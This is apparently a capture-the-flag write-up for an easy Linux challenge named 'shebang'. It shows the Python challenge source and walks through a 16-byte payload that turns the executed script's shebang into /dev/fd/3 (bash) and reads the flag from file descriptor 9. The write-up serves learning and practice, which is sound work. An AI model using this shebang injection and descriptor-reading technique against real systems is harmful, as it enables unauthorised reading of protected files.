# shebang
> Difficulty: Easy  
> Author: nopinjector  

Shebang provides us with nice kernel-supported execution functionality since 1980.

Challenge Files : [shebang.py](./shebang.py) [Dockerfile](./Dockerfile) [ynetd](./ynetd)

Given three files, but the most important one is [shebang.py](./shebang.py).

```py
def check_input(data):
    if b'.' in data:
        os._exit(1)

def main():
    os.open('/bin/bash', os.O_RDONLY)
    fd = os.open('./flag', os.O_RDONLY)
    os.dup2(fd, 9)

    path = os.path.join('/tmp', secrets.token_hex(16))

    print("#!/d", end="")
    data = os.read(0, 0x10)
    os.close(0)
    check_input(data)

    fd = os.open(path, os.O_CREAT | os.O_RDWR, 0o777)
    os.write(fd, b'#!/d' + data)
    os.close(fd)

    pid = os.fork()
    if pid == 0:
        os.setresgid(NOGROUP, NOGROUP, NOGROUP)
        os.setresuid(NOBODY, NOBODY, NOBODY)
        try:
            os.execv(path, [path])
        except:
            os._exit(-1)
    else:
        os.waitpid(pid, 0)
        os.unlink(path)
```

It first opens `/bin/bash` (which will place it to file descriptor number 3), then opens flag (which by default place it on file descriptor number 4 / after bash), but then duplicates the fd to fd 9.

It then does the following:
1. Wait for our input (maximum length: 0x10)
2. Check the input, if our input contains dot (`.`), the program will exit.
3. Prepend our input with `#!/d`
4. Write our input on a file in tmp directory
5. Fork process
6. The child process calss `os.execv` on our tmp file

So basically it runs whatever input we are giving by prepending it with `/d`. Then I check for my linux system, there is only one directory on root directory which starts with the letter `d`, that is `/dev/`
```
root@c96f122d9031:/tmp/shebang# ls /dev
core  fd  full  mqueue  null  ptmx  pts  random  shm  stderr  stdin  stdout  tty  urandom  zero
```

Great, we have fd in `dev`. So we can call `bash` again (remember that bash is in fd 3 as mentioned earlier), after that, we can call `cat` to read from fd 9 (which is the file descriptor for flag file).

My first try is using this payload:
`ev/fd/3 cat /dev/fd/9` which I think will be executed as `#!/dev/fd/3 cat /dev/fd/9`, but it doesn't work. Yeah because our input is limited to only 16 bytes.

It turns out that we can pass a file descriptor using <&`fd number`, so in this case:
`ev/fd/3 cat <&9`, but then when I try executing this payload, it gives me error
```
root@c96f122d9031:/tmp/shebang# python3 shebang.py 
ev/fd/3 cat <&9
/dev/fd/3: cat <&9: No such file or directory
```

Since /dev/fd/3 is bash, the error is equivalent as `bash: cat <&9: No such file or directory`.

After googling a little bit, I found this [question](https://unix.stackexchange.com/questions/27054/bin-bash-no-such-file-or-directory) that shows why the error occurs. And it turns out that adding `\n` before `cat` will make the payload work.

```
root@c96f122d9031:/tmp/shebang# python2 -c "print 'ev/fd/3\ncat <&9'" | python3 shebang.py 
THIS IS SUPPOSED TO BE THE FLAG
```